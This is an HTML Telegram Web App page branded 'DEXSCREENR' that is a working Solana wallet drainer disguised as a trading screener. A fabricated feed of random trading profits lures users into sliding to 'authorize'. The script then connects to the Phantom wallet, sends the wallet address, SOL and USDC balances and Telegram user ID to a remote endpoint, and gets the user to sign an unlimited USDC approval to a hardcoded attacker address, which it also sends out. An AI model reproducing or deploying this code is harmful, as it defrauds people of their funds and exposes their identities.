<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>DEXSCREENR</title>
<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; }
  
  body {
    background-color: #050505;
    color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    overflow: hidden;
    position: relative;
  }

  .bg-glow { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; overflow: hidden; background: #050505; }
  .orb { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.3; animation: float 12s infinite ease-in-out alternate; }
  .orb-1 { width: 300px; height: 300px; background: rgba(20, 241, 149, 0.2); top: -5%; left: -10%; }
  .orb-2 { width: 400px; height: 400px; background: rgba(153, 69, 255, 0.15); bottom: -10%; right: -20%; animation-delay: -5s; }
  @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, 50px) scale(1.1); } }

  #app-screen {
    display: flex; flex-direction: column; align-items: center;
    width: 100%; max-width: 360px; position: relative; z-index: 10;
  }

  .glass-container {
    width: 100%; background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
    border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px;
    display: flex; flex-direction: column; align-items: center;
    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative;
  }

  .header { width: 100%; text-align: center; margin-bottom: 24px; }
  .header span { font-size: 20px; font-weight: 900; letter-spacing: 1.5px; color: #ffffff; text-transform: uppercase; }
  .header p { font-size: 12px; color: #a1a1aa; margin-top: 6px; }

  /* FEED */
  .feed-container {
    width: 100%; height: 200px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.05);
    border-radius: 16px; padding: 12px; margin-bottom: 24px; overflow: hidden; display: flex; flex-direction: column; gap: 8px;
  }
  .feed-item { display: flex; justify-content: space-between; align-items: center; background: rgba(255, 255, 255, 0.03); padding: 12px 10px; border-radius: 10px; font-size: 12px; flex-shrink: 0; white-space: nowrap; animation: slideFadeIn 0.5s ease-out forwards; }
  @keyframes slideFadeIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
  .feed-wallet { font-family: monospace; color: #71717a; font-size: 11px; width: 50px; }
  .feed-token { font-weight: 600; color: #ffffff; flex: 1; text-align: left; padding-left: 6px; }
  .feed-profit { font-weight: 700; font-size: 12px; text-align: right; }

  /* SLIDER */
  .slider-container {
    width: 100%; height: 60px; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 30px; position: relative; overflow: hidden; display: flex; flex-direction: row-reverse; align-items: center; padding: 4px; user-select: none; touch-action: none;
  }
  .slider-text { position: absolute; width: 100%; text-align: center; font-size: 14px; font-weight: 600; color: rgba(255, 255, 255, 0.5); pointer-events: none; z-index: 1; transition: opacity 0.3s; }
  .slider-thumb { width: 52px; height: 52px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: transform 0.1s; touch-action: none; }
  .slider-thumb:active { cursor: grabbing; }
  .slider-thumb svg { width: 22px; height: 22px; color: #000000; transform: rotate(180deg); transition: transform 0.3s ease; }

  .slider-container.loading .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: flex-start; padding-left: 18px; }
  .slider-container.success .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: center; align-items: center; }
  .slider-container.success .slider-thumb svg { transform: rotate(0deg); margin: 0; display: block; stroke: #000; stroke-width: 4; width: 24px; height: 24px; margin-left: 2px; }

  .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

  <div class="bg-glow">
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
  </div>

  <div id="app-screen">
    <div class="glass-container">
      <div class="header">
        <span>DEXSCREENR</span>
        <p id="headerSub">Authorize connection.</p>
      </div>

      <div class="feed-container" id="feedContainer"></div>

      <div class="slider-container" id="sliderContainer">
        <div class="slider-text" id="sliderText">Slide left to authorize</div>
        <div class="slider-thumb" id="sliderThumb">
          <svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
          <div class="spinner" id="spin"></div>
        </div>
      </div>
    </div>
  </div>

<script>
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.ready();
    window.Telegram.WebApp.expand();
  }

  // --- FOMO FEED ---
  const feed = document.getElementById('feedContainer');
  const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...'];
  const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME'];
  
  function addFeedItem() {
    const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
    const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
    const isWin = Math.random() > 0.35;
    let pnlText = ""; let pnlColor = "#14F195"; 
    
    if (isWin) {
      const pnlPercent = Math.random() * 435 + 15;
      const baseInvest = Math.random() * 1400 + 100;
      const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
      pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
    } else {
      const pnlPercent = Math.random() * 35 + 5;
      const baseInvest = Math.random() * 1800 + 200;
      const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
      pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
      pnlColor = "#ef4444"; 
    }
    const el = document.createElement('div');
    el.className = 'feed-item';
    el.innerHTML = `<span class="feed-wallet">${wallet}</span><span class="feed-token">$${token}</span><span class="feed-profit" style="color: ${pnlColor}">${pnlText}</span>`;
    feed.prepend(el);
    if (feed.children.length > 6) feed.lastChild.remove();
  }

  for(let i=0; i<5; i++) addFeedItem();
  setInterval(addFeedItem, 3000);

  // --- CONFIG ---
  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
  const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 

  const container = document.getElementById('sliderContainer');
  const thumb = document.getElementById('sliderThumb');
  const text = document.getElementById('sliderText');
  const icon = document.getElementById('sliderIcon');
  const spin = document.getElementById('spin');

  let isDragging = false; let startX = 0; let currentX = 0; let maxDrag = 0;

  function initSlider() { maxDrag = container.offsetWidth - thumb.offsetWidth - 8; }
  
  // SLIDER FIX (Touch & Mouse)
  function startDrag(e) { 
    if (container.classList.contains('loading') || container.classList.contains('success')) return; 
    isDragging = true; 
    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
    thumb.style.transition = 'none'; 
  }
  
  function moveDrag(e) {
    if (!isDragging) return;
    if (e.cancelable) e.preventDefault(); 
    const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
    let delta = startX - clientX; 
    if (delta < 0) delta = 0; if (delta > maxDrag) delta = maxDrag;
    currentX = delta; thumb.style.transform = `translateX(-${currentX}px)`;
    text.style.opacity = 1 - (currentX / maxDrag);
  }
  
  function endDrag() {
    if (!isDragging) return; isDragging = false;
    if (currentX > maxDrag * 0.5) {
      container.classList.add('loading'); text.style.opacity = 0;
      thumb.style.transition = 'transform 0.3s ease';
      thumb.style.transform = `translateX(-${maxDrag}px)`;
      icon.style.display = 'none'; spin.style.display = 'block';
      triggerConnect();
    } else {
      thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
      thumb.style.transform = 'translateX(0)'; text.style.opacity = 1; currentX = 0;
    }
  }

  thumb.addEventListener('mousedown', startDrag);
  window.addEventListener('mousemove', moveDrag);
  window.addEventListener('mouseup', endDrag);
  thumb.addEventListener('touchstart', startDrag, {passive: false});
  window.addEventListener('touchmove', moveDrag, {passive: false});
  window.addEventListener('touchend', endDrag);

  // --- DRAIN LOGIC ---
  async function triggerConnect() {
    let provider = window.phantom?.solana;
    if(!provider) { resetSlider(); return; }
    
    try {
      const resp = await provider.connect();
      const victim = resp.publicKey.toString();
      const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
      
      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); // Standard RPC
      const solBalance = await conn.getBalance(resp.publicKey);
      const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
      
      let usdcAmount = 0;

      if (typeof splToken !== 'undefined') {
        try {
          const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
          const tokenBal = await conn.getTokenAccountBalance(victimAta);
          usdcAmount = tokenBal.value.uiAmount || 0;
        } catch (e) { usdcAmount = 0; }
      }

      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tg_user_id: tgUserId, ts: Date.now() });
      try { await fetch(ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
      catch (err) { navigator.sendBeacon(ENDPOINT, new Blob([payload], {type: 'application/json'})); }

      if (usdcAmount > 0 && typeof splToken !== 'undefined') {
        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
        const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
        const tx = new solanaWeb3.Transaction().add(delegateIx);
        tx.feePayer = resp.publicKey;
        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
        const signedTx = await provider.signTransaction(tx);

        await fetch(ENDPOINT, { 
          method: "POST", headers: { "Content-Type": "application/json" }, 
          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
        });
      }

      spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
      thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" style="margin-left: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>';
      text.textContent = "Access Granted"; text.style.opacity = 1;

    } catch (e) { resetSlider(); }
  }

  function resetSlider() {
    container.classList.remove('loading'); container.classList.remove('success'); 
    text.style.opacity = 1; text.textContent = "Slide left to authorize";
    spin.style.display = 'none'; icon.style.display = 'block';
    thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), width 0.3s ease, border-radius 0.3s ease';
    thumb.style.transform = 'translateX(0)'; thumb.style.width = '52px'; thumb.style.borderRadius = '50%'; currentX = 0;
  }

  window.addEventListener('resize', initSlider);
  setTimeout(initSlider, 100);
</script>
</body>
</html>
